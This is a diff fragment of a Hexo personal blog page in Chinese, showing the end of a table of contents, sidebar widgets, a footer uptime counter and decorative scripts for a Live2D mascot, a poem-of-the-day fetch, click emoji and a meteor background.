设置多层代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%92-%E5%8F%82%E8%80%83"><span class="toc-text">柒 参考</span></a></li></ol>
+        </div>    
+    </div>
+     -->
+</div>
+
+<div id="card-style-fun">
+    
+    <br />
+    <!-- 今日诗句 -->
+    <div id="card-div">
+        <div class="good-sentence">
+            <div class="toolio">
+                <div class="circle"><span class="red"></span></div>
+                <div class="circle"><span class="yellow"></span></div>
+                <div class="circle"><span class="green"></span></div>
+                <div class="circle"><span class="text">今日诗句</span></div>
+            </div>
+            <div class="sentence">
+                <div id="sentenceid" onload="getsentence();"></div>
+            </div>
+        </div>
+    </div>
+    <br />
+    <!-- 日期信息 -->
+    <div id="card-div">
+        <img src="//api.vvhan.com/api/ipCard?tip=A7cc" width="300" height="180">
+    </div>
+    
+</div>
+
+
+
+    </div>
+    
+</div>
+                <!-- 页脚 -->
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+            <script>
+                var now = new Date(); 
+                function createtime() { 
+                    var grt= new Date("07/10/2022 00:00:00");
+                    now.setTime(now.getTime()+250); 
+                    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+                    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+                    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+                    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+                    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+                    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+                    document.getElementById("timeDate").innerHTML = "已运行 "+dnum+" 天 "; 
+                    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+                } 
+            setInterval("createtime()",250);
+            </script>
+        </div>
+        <div>
+            &copy;
+            2022 - 2023 小C♥天天
+            <span class="footer-icon">
+                <i class="fa-brands fa-github fa-fw"></i>
+            </span>
+            &commat;小C&amp;天天
+        </div>
+        <div>
+            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX</a> 
+        </div>
+        
+    </div>
+</footer>
+
+            </div>
+            <!-- 简单的点击图片放大缩小的预览 -->
+            
+            <div name="fade">
+                <div id="preview" ref="preview" v-show="previewShow">
+                    <img id="preview-content" ref="previewContent" />
+                </div>
+            </div>
+            
+        </div>
+        <!-- 看板娘 -->
+        
+        <div id="L2dCanvas"></div>
+        <script src="/js/lib/live2d.min.js"></script>
+        <!-- 设置随机模板 -->
+        
+        <script>
+            var v = new Viewer({
+                basePath: "/model",
+                role: "tierbici_2",
+                mobile: true,
+            });
+        </script>
+        
+        <!-- 诗句 -->
+        
+        <script>
+            // // 每隔10分钟执行一次getsentence这个函数
+            window.setInterval(getsentence, 100*60*5);
+            function getsentence() {
+                // 这里没有考虑IE浏览器，如果需要择if判断加
+                var xhr = new XMLHttpRequest();  
+                xhr.open('GET', "https://zj.v.api.aa1.cn/api/wenan-shici/?type=json",true);
+                xhr.send(JSON.stringify(null));
+                xhr.onreadystatechange = function () {
+                    if (xhr.status === 200 && xhr.readyState === 4) {
+                        //js处理数据
+                        // xhr.responseText.match(/content":(".+?")/g)
+                        getdata = JSON.parse(xhr.responseText).msg;
+                    }else{
+                        getdata = "长风破浪会有时，直挂云帆济沧海。——李白《行路难》";
+                    }
+                    document.getElementById("sentenceid").innerHTML = getdata;
+                }
+            }
+            window.onload = getsentence;
+        </script>
+        
+        <!-- 点击 -->
+        <script>
+            let body = document.getElementsByTagName('body')[0];
+            body.addEventListener('click', (e) => {
+                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
+                let randomNum = function (n) {
+                    return Math.floor(Math.random() * n)
+                }
+                let span = document.createElement('span');
+                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+                span.style.position = 'absolute';
+                span.style.top = `${e.pageY}px`;
+                span.style.left = `${e.pageX}px`;
+                span.style.transition = 'all 1s ease';
+                span.style.zIndex = 20000;
+                body.appendChild(span)
+                setTimeout(()=>{
+                    span.style.top = span.offsetTop - 100 + 'px';
+                    span.style.opacity = 0;
+                    setTimeout(()=>{span.remove()},700)
+                },0)
+            })
+        </script>
+        <!-- 流星背景特效 -->
+        
+        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
+        <script src="/js/meteorbackground.js"></script>
+        
+        <script src="/js/main.js"></script>
+    </body>
+</html>
